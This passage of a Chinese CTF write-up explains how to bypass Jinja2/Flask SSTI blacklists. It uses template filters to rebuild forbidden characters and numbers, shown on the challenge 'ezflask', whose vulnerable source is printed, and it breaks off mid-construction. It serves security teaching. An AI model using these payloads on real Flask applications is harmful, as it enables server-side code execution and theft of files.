<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">org</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">app</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__doc__</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span>) <span style="color:#ff636f">%</span>}{{<span style="color:#58a1dd">org</span>}}</span></span></code></pre></div><p><img loading="lazy" src="https://shs3.b.qianxin.com/attack_forum/2022/03/attach-9a505924d7588e09975163b61be7134864b2b5a7.png" alt="image.png" srcset="https://shs3.b.qianxin.com/attack_forum/2022/03/attach-9a505924d7588e09975163b61be7134864b2b5a7.png?size=small, https://shs3.b.qianxin.com/attack_forum/2022/03/attach-9a505924d7588e09975163b61be7134864b2b5a7.png?size=medium 1.5x, https://shs3.b.qianxin.com/attack_forum/2022/03/attach-9a505924d7588e09975163b61be7134864b2b5a7.png?size=large 2x" data-title="image.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>如上图所示，可获得到的字符更多了，有等号、加号、单引号等。</p>
<ul>
<li>对于获取数字，除了上面出现的那几种外我们还可以有以下几种方法：</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">num</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">self</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">int</span>) <span style="color:#ff636f">%</span>}{{<span style="color:#58a1dd">num</span>}}    <span style="color:#828b96;font-style:italic"># 0, 通过int过滤器获取数字</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">num</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">self</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">length</span>) <span style="color:#ff636f">%</span>}{{<span style="color:#58a1dd">num</span>}}    <span style="color:#828b96;font-style:italic"># 24, 通过length过滤器获取数字</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">point</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">self</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">float</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">min</span> <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># 通过float过滤器获取点 .</span></span></span></code></pre></div><p>有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算。</p>
<p>下面我们通过两道题目payload的构造过程来演示一下如何使用过滤器来Bypass。</p>
<h3 id="2020-dasctf-八月安恒月赛ezflask" class="heading-element"><span>[2020 DASCTF 八月安恒月赛]ezflask</span>
  <a href="#2020-dasctf-%e5%85%ab%e6%9c%88%e5%ae%89%e6%81%92%e6%9c%88%e8%b5%9bezflask" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>题目源码：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#!/usr/bin/env python</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># -*- coding: utf-8 -*-</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">from</span> <span style="color:#58a1dd">flask</span> <span style="color:#ff636f">import</span> <span style="color:#58a1dd">Flask</span>, <span style="color:#58a1dd">render_template</span>, <span style="color:#58a1dd">render_template_string</span>, <span style="color:#58a1dd">redirect</span>, <span style="color:#58a1dd">request</span>, <span style="color:#58a1dd">session</span>, <span style="color:#58a1dd">abort</span>, <span style="color:#58a1dd">send_from_directory</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">app</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">Flask</span>(<span style="color:#58a1dd">__name__</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">@app.route</span>(<span style="color:#a6be9d">&#34;/&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff636f">def</span> <span style="color:#58a1dd">index</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">def</span> <span style="color:#58a1dd">safe_jinja</span>(<span style="color:#58a1dd">s</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">blacklist</span> <span style="color:#ff636f">=</span> [<span style="color:#a6be9d">&#39;class&#39;</span>, <span style="color:#a6be9d">&#39;attr&#39;</span>, <span style="color:#a6be9d">&#39;mro&#39;</span>, <span style="color:#a6be9d">&#39;base&#39;</span>,
</span></span><span style="display:flex;"><span>                     <span style="color:#a6be9d">&#39;request&#39;</span>, <span style="color:#a6be9d">&#39;session&#39;</span>, <span style="color:#a6be9d">&#39;+&#39;</span>, <span style="color:#a6be9d">&#39;add&#39;</span>, <span style="color:#a6be9d">&#39;chr&#39;</span>, <span style="color:#a6be9d">&#39;ord&#39;</span>, <span style="color:#a6be9d">&#39;redirect&#39;</span>, <span style="color:#a6be9d">&#39;url_for&#39;</span>, <span style="color:#a6be9d">&#39;config&#39;</span>, <span style="color:#a6be9d">&#39;builtins&#39;</span>, <span style="color:#a6be9d">&#39;get_flashed_messages&#39;</span>, <span style="color:#a6be9d">&#39;get&#39;</span>, <span style="color:#a6be9d">&#39;subclasses&#39;</span>, <span style="color:#a6be9d">&#39;form&#39;</span>, <span style="color:#a6be9d">&#39;cookies&#39;</span>, <span style="color:#a6be9d">&#39;headers&#39;</span>, <span style="color:#a6be9d">&#39;[&#39;</span>, <span style="color:#a6be9d">&#39;]&#39;</span>, <span style="color:#a6be9d">&#39;</span><span style="color:#a6be9d">\&#39;</span><span style="color:#a6be9d">&#39;</span>, <span style="color:#a6be9d">&#39;&#34;&#39;</span>, <span style="color:#a6be9d">&#39;</span><span style="color:#a6be9d">{}</span><span style="color:#a6be9d">&#39;</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">flag</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">True</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">for</span> <span style="color:#58a1dd">no</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">blacklist</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">if</span> <span style="color:#58a1dd">no</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">lower</span>() <span style="color:#ff636f">in</span> <span style="color:#58a1dd">s</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">lower</span>():
</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">flag</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">False</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#58a1dd">flag</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">if</span> <span style="color:#ff636f">not</span> <span style="color:#58a1dd">request</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">args</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">get</span>(<span style="color:#a6be9d">&#39;name&#39;</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#58a1dd">open</span>(<span style="color:#58a1dd">__file__</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">elif</span> <span style="color:#58a1dd">safe_jinja</span>(<span style="color:#58a1dd">request</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">args</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">get</span>(<span style="color:#a6be9d">&#39;name&#39;</span>)):
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">name</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">request</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">args</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">get</span>(<span style="color:#a6be9d">&#39;name&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">name</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;wendell&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">template</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">    &lt;div class=&#34;center-content&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">        &lt;p&gt;Hello, </span><span style="color:#a6be9d">%s</span><span style="color:#a6be9d">&lt;/p&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">    &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">    &lt;!--flag in /flag--&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">    &lt;!--python3.8--&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">&#39;&#39;&#39;</span> <span style="color:#ff636f">%</span> (<span style="color:#58a1dd">name</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">return</span> <span style="color:#58a1dd">render_template_string</span>(<span style="color:#58a1dd">template</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> <span style="color:#58a1dd">__name__</span> <span style="color:#ff636f">==</span> <span style="color:#a6be9d">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">app</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">run</span>(<span style="color:#58a1dd">host</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;0.0.0.0&#39;</span>, <span style="color:#58a1dd">port</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">5000</span>)</span></span></code></pre></div><p>可以看到题目过滤的死死地，最关键是把attr也给过滤了的话，这就很麻烦了，但是我们还可以用过滤器进行绕过。</p>
<p>在存在ssti的地方执行如下payload：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">org</span> <span style="color:#ff636f">=</span> ({ }<span style="color:#ff636f">|</span><span style="color:#58a1dd">select</span>()<span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span>()) <span style="color:#ff636f">%</span>}{{<span style="color:#58a1dd">org</span>}}
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 或 {% set org = ({ }|select|string) %}{{org}}</span></span></span></code></pre></div><p><img loading="lazy" src="https://shs3.b.qianxin.com/attack_forum/2022/03/attach-5ff40ea79bbadc83222fa1ba470c0386780dce81.png" alt="image.png" srcset="https://shs3.b.qianxin.com/attack_forum/2022/03/attach-5ff40ea79bbadc83222fa1ba470c0386780dce81.png?size=small, https://shs3.b.qianxin.com/attack_forum/2022/03/attach-5ff40ea79bbadc83222fa1ba470c0386780dce81.png?size=medium 1.5x, https://shs3.b.qianxin.com/attack_forum/2022/03/attach-5ff40ea79bbadc83222fa1ba470c0386780dce81.png?size=large 2x" data-title="image.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>可以看到，我们得到了一段字符串：<code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code>，这段字符串中不仅存在字符，还存在空格、下划线，尖号和数字。也就是说，如果题目过滤了这些字符的话，我们便可以在 <code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code> 这个字符串中取到我们想要的字符，从而绕过过滤。</p>
<p>然后我们在使用<code>list()过滤器</code>将字符串转化为列表：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">orglst</span> <span style="color:#ff636f">=</span> ({ }<span style="color:#ff636f">|</span><span style="color:#58a1dd">select</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#ff636f">list</span>) <span style="color:#ff636f">%</span>}{{<span style="color:#58a1dd">orglst</span>}</span></span></code></pre></div><p><img loading="lazy" src="https://shs3.b.qianxin.com/attack_forum/2022/03/attach-78b4707fb2dce7c5173bb6266c9b0662525b9c17.png" alt="image.png" srcset="https://shs3.b.qianxin.com/attack_forum/2022/03/attach-78b4707fb2dce7c5173bb6266c9b0662525b9c17.png?size=small, https://shs3.b.qianxin.com/attack_forum/2022/03/attach-78b4707fb2dce7c5173bb6266c9b0662525b9c17.png?size=medium 1.5x, https://shs3.b.qianxin.com/attack_forum/2022/03/attach-78b4707fb2dce7c5173bb6266c9b0662525b9c17.png?size=large 2x" data-title="image.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>如上图所示，反回了一个列表，列表中是 <code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code> 这个字符串的每一个字符。接下来我们便可以使用使用pop()等方法将列表里的字符取出来了。如下所示，我们取一个下划线 <code>_</code>：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">xhx</span> <span style="color:#ff636f">=</span> (({ }<span style="color:#ff636f">|</span><span style="color:#58a1dd">select</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">list</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">24</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span>) <span style="color:#ff636f">%</span>}{{<span style="color:#58a1dd">xhx</span>}}    <span style="color:#828b96;font-style:italic"># _</span></span></span></code></pre></div><p><img loading="lazy" src="https://shs3.b.qianxin.com/attack_forum/2022/03/attach-82d15e31969565eb1b3ffcdf9faa7d715d643fdd.png" alt="image.png" srcset="https://shs3.b.qianxin.com/attack_forum/2022/03/attach-82d15e31969565eb1b3ffcdf9faa7d715d643fdd.png?size=small, https://shs3.b.qianxin.com/attack_forum/2022/03/attach-82d15e31969565eb1b3ffcdf9faa7d715d643fdd.png?size=medium 1.5x, https://shs3.b.qianxin.com/attack_forum/2022/03/attach-82d15e31969565eb1b3ffcdf9faa7d715d643fdd.png?size=large 2x" data-title="image.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>同理还能取到更多的字符：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">space</span> <span style="color:#ff636f">=</span> (({ }<span style="color:#ff636f">|</span><span style="color:#58a1dd">select</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">list</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">10</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span>) <span style="color:#ff636f">%</span>}{{<span style="color:#58a1dd">spa</span>}}    <span style="color:#828b96;font-style:italic"># 空格</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">xhx</span> <span style="color:#ff636f">=</span> (({ }<span style="color:#ff636f">|</span><span style="color:#58a1dd">select</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">list</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">24</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span>) <span style="color:#ff636f">%</span>}{{<span style="color:#58a1dd">xhx</span>}}    <span style="color:#828b96;font-style:italic"># _</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">zero</span> <span style="color:#ff636f">=</span> (({ }<span style="color:#ff636f">|</span><span style="color:#58a1dd">select</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">list</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">38</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">int</span>) <span style="color:#ff636f">%</span>}{{<span style="color:#58a1dd">zero</span>}}    <span style="color:#828b96;font-style:italic"># 0</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">seven</span> <span style="color:#ff636f">=</span> (({ }<span style="color:#ff636f">|</span><span style="color:#58a1dd">select</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">list</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">40</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">int</span>) <span style="color:#ff636f">%</span>}{{<span style="color:#58a1dd">seven</span>}}    <span style="color:#828b96;font-style:italic"># 7</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">......</span></span></span></code></pre></div><p>这里，其实有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算，如下示例：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">zero</span> <span style="color:#ff636f">=</span> (({ }<span style="color:#ff636f">|</span><span style="color:#58a1dd">select</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">list</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">38</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">int</span>) <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># 0</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">one</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">zero</span><span style="color:#ff636f">**</span><span style="color:#58a1dd">zero</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">int</span> <span style="color:#ff636f">%</span>}{{<span style="color:#58a1dd">one</span>}}    <span style="color:#828b96;font-style:italic"># 1</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span><span style="color:#58a1dd">set</span> <span style="color:#58a1dd">two</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">zero</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">one</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">one</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">abs</span> <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># 2</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span><span style="color:#58a1dd">set</span> <span style="color:#58a1dd">three</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">zero</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">one</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">one</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">one</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">abs</span> <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># 3</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">five</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">two</span><span style="color:#ff636f">*</span><span style="color:#58a1dd">two</span><span style="color:#ff636f">*</span><span style="color:#58a1dd">two</span>)<span style="color:#ff636f">-</span><span style="color:#58a1dd">one</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">one</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">one</span> <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># 5</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#  {%set four = (one+three) %}    注意, 这样的加号的是不行的,可能是因为加号在URL里会自动识别为空格,只能用减号配合abs取绝对值了</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">......</span></span></span></code></pre></div><p>通过上述原理，我们可以依次获得构造payload所需的特殊字符与字符串：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 首先构造出所需的数字:</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">zero</span> <span style="color:#ff636f">=</span> (({ }<span style="color:#ff636f">|</span><span style="color:#58a1dd">select</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">list</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">38</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">int</span>) <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># 0</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">one</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">zero</span><span style="color:#ff636f">**</span><span style="color:#58a1dd">zero</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">int</span> <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># 1</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">two</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">zero</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">one</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">one</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">abs</span> <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># 2</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">four</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">two</span><span style="color:#ff636f">*</span><span style="color:#58a1dd">two</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">int</span> <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># 4</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">five</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">two</span><span style="color:#ff636f">*</span><span style="color:#58a1dd">two</span><span style="color:#ff636f">*</span><span style="color:#58a1dd">two</span>)<span style="color:#ff636f">-</span><span style="color:#58a1dd">one</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">one</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">one</span> <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># 5</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">seven</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">zero</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">one</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">one</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">five</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">abs</span> <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># 7</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 构造出所需的各种字符与字符串:</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">xhx</span> <span style="color:#ff636f">=</span> (({ }<span style="color:#ff636f">|</span><span style="color:#58a1dd">select</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">list</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">24</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span>) <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># _</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">space</span> <span style="color:#ff636f">=</span> (({ }<span style="color:#ff636f">|</span><span style="color:#58a1dd">select</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">list</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">10</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span>) <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># 空格</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">point</span> <span style="color:#ff636f">=</span> ((<span style="color:#58a1dd">app</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__doc__</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">list</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">26</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span>) <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># .</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">yin</span> <span style="color:#ff636f">=</span> ((<span style="color:#58a1dd">app</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__doc__</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">list</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">195</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span>) <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># 单引号 &#39;</span>
